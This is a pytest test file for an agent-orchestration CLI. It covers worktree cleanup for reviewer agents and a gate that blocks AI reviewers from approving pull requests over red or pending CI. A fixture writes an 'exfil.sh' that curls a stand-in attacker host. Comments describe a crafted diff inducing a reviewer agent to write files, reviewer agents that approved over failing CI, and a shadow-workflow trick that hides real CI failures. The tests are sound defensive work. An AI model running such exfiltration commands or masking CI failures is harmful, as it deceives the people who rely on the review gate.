# --- P1a: detach is the default; --foreground opts back into blocking (2026-07-04) ---

def test_spawn_detach_default_and_foreground_flag(agentctl, monkeypatch):
    captured = {}
    monkeypatch.setattr(agentctl, "cmd_spawn",
                        lambda args: (captured.update(vars(args)), 0)[1])

    # No --foreground → foreground is False, so the routing detaches by default.
    agentctl.main(["spawn", "coder", "--on", "x", "--task", "t"])
    assert captured["foreground"] is False
    assert (captured["detach"] or not captured["foreground"]) is True

    # --foreground → foreground True, so the routing runs inline (blocks).
    captured.clear()
    agentctl.main(["spawn", "coder", "--on", "x", "--task", "t", "--foreground"])
    assert captured["foreground"] is True
    assert (captured["detach"] or not captured["foreground"]) is False

    # --attach is an alias for --foreground.
    captured.clear()
    agentctl.main(["spawn", "coder", "--on", "x", "--task", "t", "--attach"])
    assert captured["foreground"] is True


def test_overnight_launchers_pass_foreground(agentctl):
    # The weekly launchers sequence stages by the spawn's exit code, so they MUST
    # pass --foreground now that detach is the default — otherwise stages overlap
    # as daemons and fix-drain items get reaped mid-run. Guard against a future
    # edit silently dropping it.
    import pathlib
    bin_dir = pathlib.Path(agentctl.__file__).resolve().parent
    for script in ("launch-weekly-curation", "launch-weekly-consulting"):
        text = (bin_dir / script).read_text()
        assert "--foreground" in text, f"{script} must pass --foreground to agentctl spawn"


# --- ARCH-344: review worktrees are reaped on exit ---------------------------
# A reviewer reads a commit-pinned tree and authors nothing, so its worktree is dead
# the moment the verdict is posted. Nothing reclaimed them: 802 stale trees / 10 GB
# across the fleet by 2026-07-13. These tests use REAL git worktrees — the reap
# distinguishes a linked worktree from a primary clone by whether `.git` is a file or
# a directory, which a mock cannot express.

def _make_primary(tmp_path, name="repo"):
    import subprocess as sp
    primary = tmp_path / name
    primary.mkdir()
    sp.run(["git", "init", "-q", "-b", "main"], cwd=primary, check=True)
    sp.run(["git", "config", "user.email", "t@t.t"], cwd=primary, check=True)
    sp.run(["git", "config", "user.name", "t"], cwd=primary, check=True)
    (primary / "file.py").write_text("code\n")
    sp.run(["git", "add", "-A"], cwd=primary, check=True)
    sp.run(["git", "commit", "-qm", "init"], cwd=primary, check=True)
    return primary


def _make_linked(primary, path):
    import subprocess as sp
    sp.run(["git", "worktree", "add", "-q", "--detach", str(path)], cwd=primary, check=True)
    return path


def test_reap_removes_a_review_worktree(agentctl, tmp_path):
    primary = _make_primary(tmp_path)
    wt = _make_linked(primary, tmp_path / "wt-review")
    assert (wt / ".git").is_file()          # linked worktree: .git is a FILE

    agentctl._reap_review_worktree("reviewer", wt, "run-test")
    assert not wt.exists(), "a clean review worktree must be reaped"


def test_reap_forces_past_untracked_build_debris(agentctl, tmp_path):
    """A review run leaves node_modules / coverage files behind. `git worktree remove`
    refuses an untracked-dirty tree without --force, which would have made the reap a
    no-op on exactly the trees that take the most disk."""
    primary = _make_primary(tmp_path)
    wt = _make_linked(primary, tmp_path / "wt-debris")
    (wt / "node_modules").mkdir()
    (wt / "node_modules" / "x.js").write_text("junk\n")
    (wt / "coverage.json").write_text("{}\n")

    agentctl._reap_review_worktree("security-reviewer", wt, "run-test")
    assert not wt.exists(), "untracked debris must not save a review worktree"


def test_reap_keeps_a_worktree_with_tracked_changes(agentctl, tmp_path):
    """A reviewer authors nothing, so a tracked modification means something happened
    that a human should see. Keep the tree rather than reap the evidence."""
    primary = _make_primary(tmp_path)
    wt = _make_linked(primary, tmp_path / "wt-modified")
    (wt / "file.py").write_text("MODIFIED\n")   # tracked file, changed

    agentctl._reap_review_worktree("reviewer", wt, "run-test")
    assert wt.exists(), "a review worktree with tracked changes must be kept"


def test_reap_never_touches_a_primary_checkout(agentctl, tmp_path):
    """The guard that matters. A primary clone has a `.git` DIRECTORY. Review dispatch
    can't resolve to the primary today (commit-pinning requires a dedicated purpose),
    but if that ever changed, the cost of being wrong is a human's working tree."""
    primary = _make_primary(tmp_path)
    assert (primary / ".git").is_dir()

    agentctl._reap_review_worktree("reviewer", primary, "run-test")
    assert primary.exists(), "the primary checkout must NEVER be reaped"
    assert (primary / "file.py").exists()


def test_reap_ignores_non_review_agents(agentctl, tmp_path):
    """A coder's worktree holds authored work and a branch; only review trees are
    disposable."""
    primary = _make_primary(tmp_path)
    wt = _make_linked(primary, tmp_path / "wt-coder")

    for agent_name in ("coder", "refactorer", "orchestrator"):
        agentctl._reap_review_worktree(agent_name, wt, "run-test")
        assert wt.exists(), f"{agent_name}'s worktree must not be reaped"


def test_reap_honors_the_keep_escape_hatch(agentctl, tmp_path, monkeypatch):
    """Debugging a bad review means reading the tree it ran against."""
    primary = _make_primary(tmp_path)
    wt = _make_linked(primary, tmp_path / "wt-keep")
    monkeypatch.setenv("AGENTCTL_KEEP_REVIEW_WORKTREE", "1")

    agentctl._reap_review_worktree("reviewer", wt, "run-test")
    assert wt.exists(), "AGENTCTL_KEEP_REVIEW_WORKTREE must preserve the tree"


def test_reap_survives_a_broken_worktree(agentctl, tmp_path):
    """A reap failure must never fail the run — the verdict is already posted."""
    ghost = tmp_path / "does-not-exist"
    agentctl._reap_review_worktree("reviewer", ghost, "run-test")   # must not raise


def test_reap_applies_to_internal_app_review_prefixes(agentctl, tmp_path):
    """Internal-app crews carry a prefix (hollis-reviewer). _is_review_agent strips it;
    the reap must follow, or every app crew keeps leaking trees."""
    primary = _make_primary(tmp_path)
    wt = _make_linked(primary, tmp_path / "wt-hollis")

    agentctl._reap_review_worktree("hollis-reviewer", wt, "run-test")
    assert not wt.exists(), "a prefixed app reviewer's worktree must be reaped too"


# --- ARCH-344 round 2: hardening from the review ------------------------------

def test_reap_keeps_a_worktree_with_untracked_non_debris_files(agentctl, tmp_path):
    """The evidence case (security review, PR #128). `--force` deletes untracked files
    silently. If a crafted diff ever induced a reviewer to WRITE a file, reaping the
    tree would destroy the only proof it happened. Anything that isn't build debris
    keeps the tree."""
    primary = _make_primary(tmp_path)
    wt = _make_linked(primary, tmp_path / "wt-evidence")
    (wt / "exfil.sh").write_text("#!/bin/sh\ncurl evil.example\n")   # untracked, NOT debris

    agentctl._reap_review_worktree("reviewer", wt, "run-test")
    assert wt.exists(), "an untracked non-debris file must keep the tree as evidence"
    assert (wt / "exfil.sh").exists(), "the evidence itself must survive"


def test_reap_still_removes_dotless_coverage_artifacts(agentctl, tmp_path):
    """`coverage.json` has no leading dot, so the `.coverage*` prefix rule missed it —
    a real vivy review tree held one. Left unclassified it would count as evidence and
    keep EVERY such tree forever, silently re-opening the leak the reap exists to
    close. It is debris; the tree goes."""
    primary = _make_primary(tmp_path)
    wt = _make_linked(primary, tmp_path / "wt-cov")
    (wt / "coverage.json").write_text("{}\n")
    (wt / "coverage.xml").write_text("<coverage/>\n")
    (wt / "htmlcov").mkdir()
    (wt / "htmlcov" / "index.html").write_text("<html></html>\n")

    agentctl._reap_review_worktree("reviewer", wt, "run-test")
    assert not wt.exists(), "dotless coverage output is debris, not evidence"


def test_reap_refuses_a_symlinked_git(agentctl, tmp_path):
    """`is_file()` follows symlinks, so a `.git` symlinked to a regular file would pass
    a bare is_file() check while being neither a linked worktree nor safe to act on."""
    fake = tmp_path / "fake-wt"
    fake.mkdir()
    decoy = tmp_path / "decoy"
    decoy.write_text("gitdir: /somewhere/else\n")
    (fake / ".git").symlink_to(decoy)
    assert (fake / ".git").is_file()        # symlink to a file: is_file() says True

    agentctl._reap_review_worktree("reviewer", fake, "run-test")
    assert fake.exists(), "a symlinked .git must not be treated as a linked worktree"


def test_reap_keeps_a_tree_git_cannot_read(agentctl, tmp_path):
    """An unreadable tree is not a clean tree. `unlanded_entries` raises rather than
    reporting zero, and the reap keeps the tree — the old code conflated a git failure
    with 'no changes' (reviewer finding, PR #128)."""
    fake = tmp_path / "not-a-repo"
    fake.mkdir()
    (fake / ".git").write_text("gitdir: /nonexistent\n")   # a .git FILE, but git can't use it

    agentctl._reap_review_worktree("reviewer", fake, "run-test")
    assert fake.exists(), "a tree git cannot read must be kept, not reaped"
# --- ARCH-345: review-post refuses an APPROVE over red CI ---------------------
# constance #502 (overnight 2026-07-12/13): three review rounds recorded APPROVE while
# a required check was red the entire time. The failing tests lived in a file the diff
# never touched — the breakage a diff-only read cannot see. A recorded APPROVE over red
# CI is a forged green: the PR carries two Claude signoffs and reads as vetted.

_RED = [{"name": "Backend tests (shard 3/4)", "conclusion": "FAILURE"},
        {"name": "lint", "conclusion": "SUCCESS"}]
_GREEN = [{"name": "Backend tests (shard 3/4)", "conclusion": "SUCCESS"},
          {"name": "lint", "conclusion": "SUCCESS"}]
_SHA = "cf5e988cf5e988cf5e988cf5e988cf5e988cf5e9"


def _patch_view(agentctl, monkeypatch, rollup, head=_SHA):
    def fake(pr, fields, repo=None):
        return {"statusCheckRollup": rollup, "headRefOid": head}
    monkeypatch.setattr(agentctl, "_gh_pr_json", fake)


def test_approve_blocked_when_ci_is_red(agentctl, monkeypatch):
    """The constance #502 replay: this is the call that must now fail."""
    _patch_view(agentctl, monkeypatch, _RED)
    code, why = agentctl._approve_blocked_by_ci(pr="502", repo="convivy/constance",
                                                reviewed_commit=_SHA)
    assert code == agentctl.CI_BLOCK_RED
    assert "not green" in why
    assert "Backend tests (shard 3/4)=FAILURE" in why, "must name the failing check"
    assert "BLOCKING finding" in why, "must tell the reviewer what to do instead"


def test_approve_allowed_when_ci_is_green(agentctl, monkeypatch):
    _patch_view(agentctl, monkeypatch, _GREEN)
    assert agentctl._approve_blocked_by_ci(pr="1", repo="r/r", reviewed_commit=_SHA) is None


def test_approve_still_blocked_while_ci_is_running(agentctl, monkeypatch):
    """In-flight is not green. An APPROVE that lands before CI finishes is a guess,
    so the refusal stands — but it is now classified UNKNOWN (retryable) rather than
    RED (a finding to route), and only after the wait below is exhausted.

    The distinction is the whole point: a red check is something the reviewer must
    act on; a running check is an absence of information that resolves itself.
    Telling a reviewer to "post REQUEST_CHANGES naming the failure" when nothing has
    failed sends it to invent one.
    """
    _patch_view(agentctl, monkeypatch, [{"name": "tests", "status": "IN_PROGRESS"}])
    code, why = agentctl._approve_blocked_by_ci(pr="1", repo="r/r", reviewed_commit=_SHA,
                                                wait_secs=0)
    assert code == agentctl.CI_BLOCK_PENDING
    assert "still RUNNING" in why and "Not a failure" in why
    assert "re-run" in why.lower(), "must tell the reviewer its work is not wasted"
    assert "DRAFT" in why, "must name the actual upstream bug (ARCH-364)"


def test_a_pending_check_is_waited_out_not_refused(agentctl, monkeypatch):
    """selector #271: a finished review was stranded ~24 minutes against a 15-line
    test-only diff because review-post refused over a merely-pending check.

    The wait lives HERE, in a short-lived CLI process, precisely because the agent
    cannot safely do it: a dispatched `claude -p` run that stops making tool calls
    ends, and its unposted review is lost. Three runs died that way in one session.

    The wait now polls the REST budget while the suite runs (see _ci_settled_rest)
    and spends a GraphQL read only once REST reports the suite settled. So a
    pending-then-green suite costs exactly TWO GraphQL reads — one to see pending,
    one after settle — not one per poll (the sink that drained the GraphQL pool).
    """
    views = [
        [{"name": "tests", "status": "IN_PROGRESS"}],
        [{"name": "tests", "status": "COMPLETED", "conclusion": "SUCCESS"}],
    ]
    calls = []

    def fake(pr, fields, repo=None):
        calls.append(1)
        return {"statusCheckRollup": views[min(len(calls) - 1, len(views) - 1)],
                "headRefOid": _SHA}
    monkeypatch.setattr(agentctl, "_gh_pr_json", fake)
    monkeypatch.setattr(agentctl.time, "sleep", lambda _s: None)
    monkeypatch.setattr(agentctl, "_ci_settled_rest", lambda repo, sha: True)
    assert agentctl._approve_blocked_by_ci(pr="1", repo="r/r", reviewed_commit=_SHA,
                                           wait_secs=60) is None
    assert len(calls) == 2, "one read to see pending, one after REST reports settled"


def test_a_red_check_refuses_immediately_even_with_a_wait_budget(agentctl, monkeypatch):
    """The ARCH-345 invariant is untouched. Waiting is ONLY for pending; a red check
    must not be waited on in the hope it turns green (it will not), and must still
    return RED so the reviewer routes it as a finding."""
    _patch_view(agentctl, monkeypatch, _RED)
    slept = []
    monkeypatch.setattr(agentctl.time, "sleep", lambda s: slept.append(s))
    code, why = agentctl._approve_blocked_by_ci(pr="1", repo="r/r", reviewed_commit=_SHA,
                                                wait_secs=900)
    assert code == agentctl.CI_BLOCK_RED and "BLOCKING finding" in why
    assert not slept, "a red check must refuse at once, never wait"


def test_a_mixed_rollup_is_red_not_pending(agentctl, monkeypatch):
    """One failure alongside a still-running check is a FAILURE. Waiting for the
    pending one would delay a refusal that is already certain."""
    _patch_view(agentctl, monkeypatch,
                [{"name": "lint", "status": "COMPLETED", "conclusion": "FAILURE"},
                 {"name": "tests", "status": "IN_PROGRESS"}])
    slept = []
    monkeypatch.setattr(agentctl.time, "sleep", lambda s: slept.append(s))
    code, why = agentctl._approve_blocked_by_ci(pr="1", repo="r/r", reviewed_commit=_SHA,
                                                wait_secs=900)
    assert code == agentctl.CI_BLOCK_RED and "lint=FAILURE" in why
    assert not slept


def test_split_rollup_separates_red_from_pending(agentctl):
    red, pending = agentctl._split_rollup([
        {"name": "a", "status": "COMPLETED", "conclusion": "SUCCESS"},
        {"name": "b", "status": "COMPLETED", "conclusion": "FAILURE"},
        {"name": "c", "status": "IN_PROGRESS"},
        {"context": "d", "state": "PENDING"},
        {"context": "e", "state": "ERROR"},
    ])
    assert red == ["b=FAILURE", "e=ERROR"]
    assert pending == ["c=IN_PROGRESS", "d=PENDING"]


# --- path-keyed rollup collapse (shadow-workflow bypass fix) -----------------
# A collaborator with write access can add .github/workflows/shadow.yml with
# name: ci (matching the real workflow's YAML name) and a job named like a real
# check. Under workflowName keying, newest-wins drops the real FAILURE when the
# injected SUCCESS finishes last. Keying by workflow FILE PATH closes this:
# two files cannot share a path, so the injected job lands on its own key.

def _make_path_rollup(real_run_id, shadow_run_id):
    """Two entries: same workflowName+checkName, different workflow file paths.
    The shadow entry (newer) has conclusion SUCCESS; the real entry has FAILURE."""
    return [
        {"name": "python", "workflowName": "ci",
         "detailsUrl": f"https://github.com/o/r/actions/runs/{real_run_id}/job/1",
         "conclusion": "FAILURE", "completedAt": "2026-07-27T01:00:00Z"},
        {"name": "python", "workflowName": "ci",
         "detailsUrl": f"https://github.com/o/r/actions/runs/{shadow_run_id}/job/2",
         "conclusion": "SUCCESS", "completedAt": "2026-07-27T01:00:10Z"},
    ]


def test_shadow_workflow_bypass_is_blocked(agentctl):
    """The shadow-workflow bypass no longer works once path-keyed.

    Two entries share workflowName="ci" and checkName="python" but come from
    different files. With workflowName keying (no path_map), the newer injected
    SUCCESS shadows the real FAILURE. With path_map, they get separate keys and
    the real FAILURE remains visible.
    """
    real_run_id, shadow_run_id = 30001, 30002
    path_map = {
        real_run_id: ".github/workflows/ci.yml",
        shadow_run_id: ".github/workflows/shadow.yml",
    }
    rollup = _make_path_rollup(real_run_id, shadow_run_id)

    # Without path_map: workflowName keying — same key, injected SUCCESS wins, gate is green
    assert agentctl._ci_is_green(rollup, path_map=None), \
        "workflowName keying (no path_map) lets the shadow job collapse the real FAILURE — known pre-fix behaviour"

    # With path_map: separate keys — real FAILURE stays visible, gate is red
    assert not agentctl._ci_is_green(rollup, path_map=path_map), \
        "real FAILURE must survive when path map separates same-named entries from different files"


def test_genuine_same_path_rerun_still_collapses(agentctl):
    """A re-run of the same workflow (same file, same job name) still collapses.

    Two runs both come from .github/workflows/ci.yml: the earlier one failed,
    the later one succeeded. Path-keyed, they share the same key; latest wins.
    """
    run_id_v1, run_id_v2 = 40001, 40002
    path_map = {
        run_id_v1: ".github/workflows/ci.yml",
        run_id_v2: ".github/workflows/ci.yml",
    }
    rollup = [
        {"name": "python", "workflowName": "ci",
         "detailsUrl": f"https://github.com/o/r/actions/runs/{run_id_v1}/job/1",
         "conclusion": "FAILURE", "completedAt": "2026-07-27T01:00:00Z"},
        {"name": "python", "workflowName": "ci",
         "detailsUrl": f"https://github.com/o/r/actions/runs/{run_id_v2}/job/2",
         "conclusion": "SUCCESS", "completedAt": "2026-07-27T01:00:10Z"},
    ]
    assert agentctl._ci_is_green(rollup, path_map=path_map), \
        "a genuine same-workflow re-run must still collapse to the latest (SUCCESS) result"


def test_run_id_from_details_url_parses_correctly(agentctl):
    """_run_id_from_details_url extracts the run-id from a real detailsUrl."""
    f = agentctl._run_id_from_details_url
    assert f("https://github.com/o/r/actions/runs/30232205915/job/89873065934") == 30232205915
    assert f("https://github.com/o/r/actions/runs/1/job/2") == 1
    assert f("") is None
    assert f(None) is None
    assert f("https://github.com/o/r/actions/runs/notanumber/job/1") is None
    assert f("https://github.com/o/r/pull/123") is None
    # The pattern anchors to 'actions/runs/' so a crafted URL embedding /runs/<id>/
    # at a non-actions path cannot inject a run-id match (Finding 4, round-2 review).
    assert f("https://github.com/apps/myapp/runs/99999/completed") is None


